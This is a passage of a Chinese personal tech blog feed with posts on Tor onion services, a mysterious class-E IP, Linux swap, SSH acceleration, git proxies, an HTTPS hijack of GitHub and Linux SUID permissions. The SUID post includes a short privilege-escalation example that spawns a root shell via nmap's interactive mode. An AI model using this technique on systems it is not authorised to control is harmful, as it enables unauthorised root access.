	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制</p>
]]></description></item><item><title>一个来自保留IP地址的连接</title><link>https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/</link><pubDate>Mon, 25 May 2020 15:22:09 +0000</pubDate><author/><guid>https://lgf.im/posts/events/why-reveice-connection-from-class-e-ip/</guid><description><![CDATA[<p>昨天看了一篇文章，文章最后使用IP logger进行钓鱼，最后记录下来的IP地址让我大跌眼镜</p>
<p>万万没有想到，记录下来的IP地址竟然是是 244.242.105.51</p>
<p></p>
<p>这可是一个E类IP地址，是属于保留地址，是未来用来做ip研究用的，目前并没有开放使用啊</p>
<p>考虑到文章中是对一个地下黑客组织进行钓鱼，所以我有理由相信，这个访问记录是通过某种高超的我从来没有听说过的手段实现的</p>
<p>IP Logger为啥会记录到这样一个IP的访问呢？ 这个问题一直到现在都在困扰我</p>
<p>下面记录一下我对这个的分析</p>
<h2 id="大端小端">大端？小端？</h2>
<p>众所周知计算机程序根据cpu架构和操作系统种类不同，数据在内存中存放有大端序和小端序两种情况，这个顺序叫做主机序</p>
<p>而网络传输需要在不同主机序的计算机之间兼容，所以又规定了一个网络序，规定网络传输一律使用大端序</p>
<p>文章中作者猜测是访问者使用的主机是小端序的，所以会又这样一个记录</p>
<p>我个人认为这个猜测不成立</p>
<p>因为一般ip层报文都是由操作系统网络栈来构造的，操作系统自身不会犯忘记转换成网络序的错误</p>
<p>即使是访问者技术高超自己写代码构造的ip包，那源ip是E类ip地址，返程的ip包根本没有路由啊，这样子连tcp连接都建立不了，更不要谈ip logger记录下浏览器的user-agent</p>
<h2 id="tor">Tor?</h2>
<p>考虑到记录下来的user-agent与tor浏览器的一致，并且对方是黑客组织，使用tor也是非常普遍，所以分析一下通过tor能不能实现伪造自己的ip为E类ip</p>
<p>tor连接的流程中，每个tor relay不会知道完整的路由路径，只知道上一个节点与下一个节点，并且这个路由是在应用层实现的，如果黑客控制了某些tor relay，通过这些relay能不能实现这个伪造？</p>
<h3 id="提供onion-service">提供onion service</h3>
<p>如果ip logger提供onion service，那他记录下来的ip应该是 会合节点的ip</p>
<p>通过我上一篇博客学习的内容可以知道，这个会合节点是由客户端选择的，所以我们假设黑客这里选择了自己控制的某个tor relay作为会合节点，并且将这个E类ip地址写在介绍信中发送给介绍节点</p>
<p>ip logger服务器如果没有怀疑这个E类IP地址，通过tor网络去连接这个会合节点，那在它的exit relay那里一定会连不上这个ip，因为会出现空路由</p>
<p>所以如果要让连接成功建立，必须让ip logger到会合节点的relay路径中某个relay节点对这个错误的ip进行了更正，最简单的是控制exit relay，检查到最终访问的是错误ip便进行更正</p>
<p>而这个relay路径中的每个relay都是ip logger自己选择的，所以黑客需要控制tor网络中的大部分relay????这不现实！！！</p>
<h3 id="不提供onion-service">不提供onion service</h3>
<p>如果ip logger不是提供onion service，而是提供公开的服务，那它记录下来的应该是 黑客选择的exit relay，即使黑客控制了这个relay也没办法伪造ip啊</p>
<p>所以通过tor的某些机制伪造成这个E类ip不太现实</p>
<h2 id="路由劫持">路由劫持？</h2>
<p>我对公网的路由不太了解，但是看样子进行路由劫持是有可能的</p>
<p>如果黑客创建了一条假的路由路径，并在路由途中的某个节点对这个E类ip进行更正，也是有可能的，不过看起来难度很大啊</p>
<blockquote>
<p>才疏学浅，文中可能有错误，欢迎指正
目前这个问题还在困扰我，如果有大佬知道答案，希望能够告诉我</p>
</blockquote>
]]></description></item><item><title>Tor洋葱服务如何工作</title><link>https://lgf.im/posts/learn/how-do-onion-service-work/</link><pubDate>Mon, 25 May 2020 14:13:37 +0000</pubDate><author/><guid>https://lgf.im/posts/learn/how-do-onion-service-work/</guid><description><![CDATA[<p>昨天遇到了点问题，为了研究清楚原理，把Tor客户端与服务端通信的具体流程学习了一下，这篇博文写来记录</p>
<h2 id="通信流程">通信流程</h2>
<p>这里要描述的通讯是 用户通过 tor浏览器 连接 洋葱服务 的过程</p>
<p>为了方便表达，这里用Alice表示客户端，Bob表示服务端</p>
<h3 id="第一步服务端设置自己的介绍节点">第一步：服务端设置自己的介绍节点</h3>
<p></p>
<p>服务端为了不暴漏自己的IP，使用 介绍节点(introduction points) 来转发来自客户端的介绍信</p>
<p>首先，Bob从 tor中继节点列表 中挑选几个节点来做自己的 介绍节点，然后与它们建立 长连接(long-term circuits)</p>
<p>这里的长连接是通过tor网络建立起来的，所以是匿名的，介绍节点不会知道Bob的IP</p>
<p>同时，Bob会给介绍节点发送一个 身份验证密钥(authentication key)，当有客户端连接这个介绍节点时，通过这个密钥便能判断这个连接是否是找Bob的</p>
<h3 id="第二步服务端公开自己的信息">第二步：服务端公开自己的信息</h3>
<p></p>
<p>Bob 生成一个 描述信息(onion service descriptor)，里面存储了介绍节点列表，包括介绍节点的ip和相应的身份验证密钥</p>
<p>然后Bob用自己的私钥对这个消息签名，并将这个消息发布到Tor的DHT中</p>
<p>经过这步操作，tor客户端便可以通过某个key从DHT中获取到这个消息，从而找到Bob的介绍节点</p>
<h3 id="第三步客户端获取介绍节点列表">第三步：客户端获取介绍节点列表</h3>
<p></p>
<p>Alice（客户端）从某些途径知道Bob有一个洋葱服务，并且知道这个服务的onion域名，例如 xyz.onion，此时Alice想要访问Bob.</p>
<p>首先，她向DHT网络请求该域名对应的信息，也就是第二步中Bob发布的那个描述消息</p>
<p>获取到消息后，Alice对其签名进行验证，验证使用的Bob的公钥其实已经被编码到 xyz.onion 这个域名中了，Alice可以从域名中解码出来</p>
<p>消息没问题，Alice从消息中解析出Bob的介绍节点列表，选择其中一个介绍节点，Alice将要向Bob介绍自己</p>
<h3 id="第四步客户端选择一个会合节点">第四步：客户端选择一个会合节点</h3>
<p></p>
<p>Alice从tor中继节点列表中选择一个节点作为 会合节点(rendezvous point)，然后通过tor与该 会合节点(RP) 建立连接</p>
<p>同时，Alice会给会合节点发送一个 一次性密码(one-time secret)，这个密码会在回合过程中使用</p>
<h3 id="第五步客户端向服务端介绍自己">第五步：客户端向服务端介绍自己</h3>
<p>Alice生成一个消息，包含 会合节点 和 一次性密码，然后用Bob的公钥对消息进行加密</p>
<p>Alice通过Tor网络连接上 Bob 的一个介绍节点，让该介绍节点把加密后的消息转发给Bob</p>
<p></p>
<h3 id="第六步服务端与客户端回合">第六步：服务端与客户端回合</h3>
<p></p>
<p>此时Bob已经收到介绍节点转发过来的消息，知道Alice想要访问自己，并且知道了会合节点的信息</p>
<p>Bob通过Tor网络连接会合节点，然后将收到的一次性密码发送给会合节点，会合节点由此知道 Bob是要与Alice通信，从而可以将Alice与Bob的消息进行中继</p>
<h2 id="安全性">安全性</h2>
<p>客户端与服务端最终是通过会合节点通讯的，他们都各自通过tor网络分别连接会合节点，因此既能够保证客户端的隐匿性又能够保证服务端不暴露</p>
<p>在上面流程中的所有通讯都是用过tor网络建立的，包括 服务端与介绍节点的通讯、客户端与介绍节点的通讯、客户端与会合节点的通讯、服务端与会合节点的通讯</p>
<p>因此，正常情况下tor客户端与洋葱服务通讯是经过6次中转的，包括客户端连接会合节点的3次和服务端连接会合节点的3次</p>
<p>如果tor客户端访问的服务不是洋葱服务，那通讯过程就不是上面那个流程了，也只有3次中转了</p>
<h2 id="参考资料">参考资料</h2>
<p><a href="https://community.torproject.org/onion-services/overview/">https://community.torproject.org/onion-services/overview/</a></p>
]]></description></item><item><title>Linux添加swap</title><link>https://lgf.im/posts/linux/linux-add-swap/</link><pubDate>Sun, 12 Apr 2020 20:38:26 +0000</pubDate><author/><guid>https://lgf.im/posts/linux/linux-add-swap/</guid><description><![CDATA[<p>给 linux 服务器添加swap做了好几次了，每一次都没记住，临时去网上查命令，这里特地记录一下</p>
<h2 id="查看当前swap">查看当前swap</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo swapon --show
</code></pre></td></tr></table>
</div>
</div><p>如果没有输出说明没有swap</p>
<p>也可以通过free命令来查看</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">free -h
</code></pre></td></tr></table>
</div>
</div><h2 id="添加swap">添加swap</h2>
<p>添加swap基本步骤： 创建一个大文件 -&gt; 初始化文件为swap交换文件格式 -&gt; 启用这个文件</p>
<h3 id="创建大文件">创建大文件</h3>
<p>先找一个剩余空间大点的地方创建一个大文件，这里以1G的大小为例，一般swap空间大小以真实物理内存1-2倍大小</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 我喜欢用的方法，速度快</span>
sudo fallocate -l 1G /swapfile
<span class="c1"># 如果没有安装可以用dd命令，比较慢</span>
sudo dd <span class="k">if</span><span class="o">=</span>/dev/zero <span class="nv">of</span><span class="o">=</span>/swapfile <span class="nv">bs</span><span class="o">=</span><span class="m">1024</span> <span class="nv">count</span><span class="o">=</span><span class="m">1048576</span>
</code></pre></td></tr></table>
</div>
</div><p>修改文件的权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo chmod <span class="m">600</span> /swapfile
</code></pre></td></tr></table>
</div>
</div><h3 id="初始化文件">初始化文件</h3>
<p>创建完文件后需要将文件进行初始化，标记为swap文件格式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo mkswap /swapfile
</code></pre></td></tr></table>
</div>
</div><h3 id="启用swap">启用swap</h3>
<p>接下来使用 命令启用这个swap交换文件</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo swapon /swapfile
</code></pre></td></tr></table>
</div>
</div><p>要让创建好的 swap 分区永久生效，可以将 swapfile 路径内容写入到 <code>/etc/fstab</code> 文件当中：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">/swapfile swap swap defaults <span class="m">0</span> <span class="m">0</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="检查">检查</h3>
<p>用一开始的命令检查一下swap是否启用正常</p>
<h2 id="移除swap分区">移除SWAP分区</h2>
<p>根据添加的顺序反着来就行： 取消swap -&gt; 删除swap分页文件</p>
<h3 id="取消swap">取消swap</h3>
<p>首先输入以下命令停用 SWAP 空间：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo swapoff -v /swapfile
</code></pre></td></tr></table>
</div>
</div><p>在 <code>/etc/fstab</code> 文件中删除有效 swap 的行。</p>
<h3 id="删除文件">删除文件</h3>
<p>最后执行以下命令删除 swapfile 文件：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo rm /swapfile
</code></pre></td></tr></table>
</div>
</div><h2 id="调整swappiness值">调整Swappiness值</h2>
<p>Swappiness 是一个 Linux 内核属性，用于定义 Linux 系统使用 SWAP 空间的频率。Swappiness 值可以从 0 至 100，较低的值会让内核尽可能少的使用 SWAP 空间，而较高的值将让 Linux Kernel 能够更加积极地使用 SWAP 分区。</p>
<p>Ubuntu 18.04 默认的 Swappiness 值为 60，您可以使用如下命令来查看：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/sys/vm/swappiness
</code></pre></td></tr></table>
</div>
</div><p>值为 60 对于 Ubuntu 18.04 桌面还算行，但对于 Ubuntu Server 来说，SWAP 的使用频率就比较高了，所以您可能需要设置较低的值。例如，要将 swappiness 值设置为 40，请执行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">sudo sysctl vm.swappiness<span class="o">=</span><span class="m">40</span>
</code></pre></td></tr></table>
</div>
</div><p>如果要让设置在系统重启后依然有效，则必要在 /etc/sysctl.conf 文件中添加以下内容：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">vm.swappiness<span class="o">=</span><span class="m">40</span>
</code></pre></td></tr></table>
</div>
</div><p>最佳 swappiness 值取决于您系统的工作负载以及内存的使用方式，您应该以小增量的方式来调整此参数，以查到最佳值。</p>
]]></description></item><item><title>使用GlobalSSH服务加速境外服务器ssh访问</title><link>https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/</link><pubDate>Sun, 12 Apr 2020 16:37:56 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/</guid><description><![CDATA[<blockquote>
<h3 id="ucloud已经对加速ip进行限制本文中的方法即时失效">UCloud已经对加速IP进行限制，本文中的方法即时失效</h3>
<p>通知内容如下：<br>
尊敬的UCloud用户，您好！<br>
GlobalSSH产品即日起将暂时限制服务器IP地址范围，<br>
仅允许添加UCloud平台上的IP地址，已创建的资源仍然可继续使用。 <br>
GlobalSSH版本与功能支持将持续更新，敬请关注。</p>
</blockquote>
<p>由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问</p>
<p>通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便</p>
<p></p>
<p>但是这种方法有两大劣势：</p>
<ol>
<li>如果科学上网服务器不稳定经常断流就会导致ssh连接断开</li>
<li>部分客户端不支持设置http或者socks代理</li>
</ol>
<h2 id="globalssh">GlobalSSH</h2>
<p>今天发现了一个免费的加速服务，非常方便，推荐给需要的人</p>
<p>这就是 UCloud 免费提供的 GlobalSSH 加速服务</p>
<p>官网链接： <a href="https://console.ucloud.cn/upathx/globalssh">https://console.ucloud.cn/upathx/globalssh</a></p>
<p>官方文档： <a href="https://docs.ucloud.cn/pathx/globalssh">https://docs.ucloud.cn/pathx/globalssh</a></p>
<p>这项服务目前是免费的，<del>也不需要进行实名认证</del> 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错</p>
<p>支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁</p>
<p>在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点</p>
<p></p>
<p>创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器</p>
<p>在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了</p>
<h2 id="注意事项">注意事项</h2>
<ol>
<li>自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧</li>
<li>每个源IP只能加速一个端口</li>
<li>加速流量上限官方未注明，滥用的话会被封</li>
</ol>
<h2 id="妙用">妙用</h2>
<p>众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度</p>
<p>而git是可以用ssh协议的，所以我们只需要从 <a href="https://api.github.com/meta">https://api.github.com/meta</a> 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了</p>
<p>经过我的尝试效果还不错，可以跑到10Mbps</p>
<p>我用的域名为 <code>githubssh.xyz</code> ，大家可以拿去用，使用方法如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">原命令
git clone git@github.com:moby/moby.git

替换后
git clone git@githubssh.xyz:moby/moby.git
</code></pre></td></tr></table>
</div>
</div><p>为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡</p>
<p>开源地址为： <a href="https://github.com/zu1k/globalssh4github">https://github.com/zu1k/globalssh4github</a></p>
<p>同时为了方便，改了一个插件： <a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo">https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo</a></p>
]]></description></item><item><title>学习Linux中的SUID机制</title><link>https://lgf.im/posts/linux/linux-suid/</link><pubDate>Mon, 30 Mar 2020 11:36:25 +0000</pubDate><author/><guid>https://lgf.im/posts/linux/linux-suid/</guid><description><![CDATA[<h2 id="什么是suid">什么是SUID</h2>
<p>SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p>
<p>同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例</p>
<p>在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID：</p>
<ul>
<li>Real User ID</li>
<li>Effective User ID</li>
<li>Saved User ID</li>
</ul>
<p><code>Real User ID</code> 是执行这个程序的用户的真实ID，是已用户login时候的ID为准</p>
<p><code>Effective User ID</code> 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID</p>
<p><code>Saved User ID</code> 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID</p>
<h2 id="suid的作用">SUID的作用</h2>
<p>如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序</p>
<p>简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p>
<p>举个例子：</p>
<p>所有用户的密码保存在 <code>/etc/shadow</code> 文件中，但是这个文件只有root用户能够进行写操作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# ls -l /etc/shadow
-rw-r----- <span class="m">1</span> root shadow <span class="m">1639</span> Jan <span class="m">27</span> 12:50 /etc/shadow
</code></pre></td></tr></table>
</div>
</div><p>那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？</p>
<p>显然不需要，修改密码用到了 <code>/usr/bin/passwd</code> 这个程序，我们来看一下它的权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# ls -l /usr/bin/passwd
-rwsr-xr-x <span class="m">1</span> root root <span class="m">63944</span> Dec <span class="m">20</span> 10:39 /usr/bin/passwd
</code></pre></td></tr></table>
</div>
</div><p>可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说）</p>
<p>这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改<code>/etc/shadow</code>文件</p>
<p>SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号</p>
<h2 id="如何使用suid">如何使用SUID</h2>
<h3 id="查看suid">查看SUID</h3>
<p>通过命令 <code>ls -l</code> 即可看到文件的详细信息，包括权限表 <code>-rwxrwxrwx</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">-   rwx   rwx   rwx

第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了

后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限

每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限

如果文件所有者权限的 x 换成 s 就代表设置了SUID

同理如果组内用户权限的 x 换成了 s 就代表设置了SGID
</code></pre></td></tr></table>
</div>
</div><h3 id="设置suid">设置SUID</h3>
<p>使用 <code>chmod 4000 filename</code> 可以设置SUID位</p>
<p>使用 <code>chmod 2000 filename</code> 可以设置SGID位</p>
<p>使用 <code>chmod 6000 filename</code> 可以同时设置SGID和SUID位</p>
<blockquote>
<p>注意: 2000\4000\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755</p>
</blockquote>
<h3 id="取消suid">取消SUID</h3>
<p>使用 <code>chmod 755 filename</code> 可以取消SGID和SUID位</p>
<p>或者 <code>chmod u-s filename</code> or <code>chmod g-s filename</code> 也可以</p>
<h2 id="suid提权">SUID提权</h2>
<p>因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权</p>
<p>示例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 进入nmap的交互模式</span>
nmap --interactive
<span class="c1"># 执行sh，提权成功</span>
!sh
</code></pre></td></tr></table>
</div>
</div><p>详细介绍见： <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
<h2 id="suid在脚本中失效">SUID在脚本中失效</h2>
<p>假如user1用 <code>chmod 4777 /home/user1/script.sh</code> 命令给<code>script.sh</code>脚本设置SUID位，登录user2后执行这个脚本提示没有权限</p>
<p>这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了</p>
<p>Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位</p>
]]></description></item><item><title>给git设置代理</title><link>https://lgf.im/posts/coding/set-proxy-for-git/</link><pubDate>Fri, 27 Mar 2020 15:45:02 +0000</pubDate><author/><guid>https://lgf.im/posts/coding/set-proxy-for-git/</guid><description><![CDATA[<p>近期，Github的直连速度一直不理想，甚至被墙或者MITM，最好的解决办法就是挂代理</p>
<p>Git 可以使用四种不同的协议来传输资料：本地协议（Local），HTTP 协议，SSH（Secure Shell）协议及 Git 协议</p>
<p>而我们平时使用github一般使用两种协议，一种是http协议，另一种是ssh协议，针对这两种协议有两种不同的代理设置办法</p>
<h2 id="http协议">http协议</h2>
<p>通常使用的链接形如：<code>https://github.com/git/git.git</code></p>
<p>针对这种协议，代理设置比较简单</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># http或https代理</span>
git config --global https.proxy http://127.0.0.1:1080
git config --global https.proxy https://127.0.0.1:1080

<span class="c1"># 取消代理</span>
git config --global --unset http.proxy
git config --global --unset https.proxy
</code></pre></td></tr></table>
</div>
</div><h2 id="ssh协议">ssh协议</h2>
<p>通常使用的链接形如：<code>git@github.com:git/git.git</code> 或者 <code>ssh://[&lt;username&gt;@]&lt;server&gt;[:&lt;port&gt;]/path/repo.git</code></p>
<p>对于使用ssh协议的库，上面的代理设置办法就失效了，需要给ssh设置socks代理</p>
<p>在 <code>~/.ssh/config</code> 文件中添加下面内容， 如果没有这个文件就新建</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Host github.com
ProxyCommand nc -X <span class="m">5</span> -x 127.0.0.1:1080 %h %p
</code></pre></td></tr></table>
</div>
</div><p>这里使用的是nc命令，linux需要安装netcat(一般自带了)，windows需要单独下载</p>
<p>windows如果安装了<code>mingw</code>也可以使用<code>connect</code>命令来替代<code>nc</code>命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">Host github.com
ProxyCommand connect -S 127.0.0.1:1080 %h %p
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>补充： 详见 <a href="https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html">https://blog.lgf.im/2020/use-ucloud-globalssh-to-speedup-server-ssh.html</a>
可以通过 GlobalSSH 的海外加速服务来加速github的访问，经过我的尝试效果还不错，可以跑到10Mbps
我用的域名为 <code>zll.us</code> ，大家可以拿去用，使用方法如下：</p>
</blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">原命令
git clone git@github.com:moby/moby.git

替换后
git clone git@zll.us:moby/moby.git
</code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>Github等大面积https劫持</title><link>https://lgf.im/posts/events/mitm-https-hijack-github/</link><pubDate>Fri, 27 Mar 2020 08:47:11 +0000</pubDate><author/><guid>https://lgf.im/posts/events/mitm-https-hijack-github/</guid><description><![CDATA[<p>昨天下午两点多，突然在一个站长群里听到有人说 Github Pages 的证书大批量出现错误，不一会就在V2EX上看到相关讨论的帖子</p>
<p>当天晚上再次刷V2EX的时候发现部分cloudflare的IP和京东主站部分IP也出现相似的劫持事件</p>
<p>今天早晨8点左右，在V2EX上发现有人讨论 Github 主站出现相同的https劫持，不经过代理访问发现证书的确异常</p>
<p></p>
<p>查看证书详情</p>
<p></p>
<p></p>
<h2 id="检查github证书">检查Github证书</h2>
<p>这里我通过北京和香港两台阿里云主机，使用openssl提供的方法查看证书详细内容</p>
<p>命令为: <code>openssl s_client -showcerts -connect github.com:443 &lt; /dev/null</code></p>
<h3 id="北京阿里云">北京阿里云</h3>
<details>
  <summary>点击展开</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
